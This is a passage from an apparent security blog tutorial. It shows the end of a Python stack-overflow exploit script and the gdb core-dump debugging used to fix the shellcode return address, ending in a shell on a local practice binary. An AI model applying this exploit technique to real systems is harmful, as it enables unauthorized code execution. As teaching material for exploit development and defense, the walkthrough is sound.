    args <span style="color:#f92672">=</span> [vuln, payload]
    env <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;PEDA&#34;</span>:nops()}
    resource<span style="color:#f92672">.</span>setrlimit(resource<span style="color:#f92672">.</span>RLIMIT_STACK, (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
    resource<span style="color:#f92672">.</span>setrlimit(resource<span style="color:#f92672">.</span>RLIMIT_CORE, (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
    os<span style="color:#f92672">.</span>execve(vuln, args, env)

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
        usage()
    <span style="color:#66d9ef">else</span>:
        exploit(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>])</code></pre></div>
Lets run it !!!!</p>

<pre><code>  $ ./exploit.py ./vuln
  Illegal instruction (core dumped)
</code></pre>

<p>Why did this core dump? Well more likely that the address for our shellcode is
now wrong because we were running in gdb before. Luckily it has core dumped and
left a core file around so lets open this up in gdb</p>

<pre><code>  $ gdb ./vuln ./core
  gedb-peda$ stack
  Warning: not running or target is remote
  0000| 0xbffff820 (nop)
  0004| 0xbffff824 (nop)
  0008| 0xbffff828 (nop)
  0012| 0xbffff82c (nop)
  0016| 0xbffff830 (nop)
  0020| 0xbffff834 (nop)
  0024| 0xbffff838 (nop)
  0028| 0xbffff83c (nop)
</code></pre>

<p>As you can see the address is different we adjust this script to point to
0xbffff83c instead (the parameter to int2hexstr) and lets see how that works out</p>

<pre><code>  $ ./exploit.py ./vuln
  AAAAAAAAAAAA.............
  $
</code></pre>

<p>Nice!! we ended up with a shell (those running bash will have seen their prompt
change</p>

<p>Level 1 complete! Next up what happens when we cant execute code from the
stack!!!!</p>

    </div>
  </article>
<section id="comments">
</section>

</div><nav class="bar bar-footer clearfix" data-stick-bottom>
    <div class="bar-inner">
        <ul class="pager pull-left">
            <li class="prev">
                <a href="/2016/11/crafting-shellcode/" title="Crafting Shellcode"><i
                        class="icon icon-angle-left"
                        aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
            </li>
            <li class="next">
                <a href="/2017/03/slae-tcp-bind-shell/"
                    title="SLAE Tcp Bind Shell"><span>Older&nbsp;&nbsp;</span><i
                        class="icon icon-angle-right" aria-hidden="true"></i></a>
            </li>
            
            <li class="toggle-toc">
                <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false"
                    title="Catalogue" role="button">
                    <span>[&nbsp;</span><span>Catalogue</span>
                    <i class="text-collapsed icon icon-anchor"></i>
                    <i class="text-in icon icon-close"></i>
                    <span>]</span>
                </a>
            </li>
        </ul>
        <div class="bar-right">
        </div>
    </div>
</nav>
</main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
<ul class="social-links">
    <li><a href="https://github.com/mwest67" target="_blank" title="github" data-toggle=tooltip data-placement=top >
            <i class="icon icon-github"></i></a></li>
    <li><a href="/index.xml" target="_blank" title="rss" data-toggle=tooltip data-placement=top >
            <i class="icon icon-rss"></i></a></li>
</ul>
  <div class="copyright">
    &copy;2016  -
    2019
    <div class="publishby">
        Theme by <a href="https://github.com/xiaoheiAh" target="_blank"> xiaoheiAh </a>base on<a href="https://github.com/xiaoheiAh/hugo-theme-pure" target="_blank"> pure</a>.
    </div>
  </div>
</footer>
<script src="https://cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
<script>
   window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
</script>
<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>

<script>
hljs.configure({
  tabReplace: '    ', 
  classPrefix: ''     
                      
})
hljs.initHighlightingOnLoad();
</script>
<script type="text/javascript" src="/js/application.js"></script>
<script type="text/javascript" src="/js/plugin.js"></script>
<script>
      (function (window) {
          var INSIGHT_CONFIG = {
              TRANSLATION: {
                  POSTS: 'Posts',
                  PAGES: 'Pages',
                  CATEGORIES: 'Categories',
                  TAGS: 'Tags',
                  UNTITLED: '(Untitled)',
              },
              ROOT_URL: '\/',
              CONTENT_URL: '\/\/searchindex.json ',
          };
          window.INSIGHT_CONFIG = INSIGHT_CONFIG;
      })(window);
      </script>
<script type="text/javascript" src="/js/insight.js"></script>


  </body>
</html>
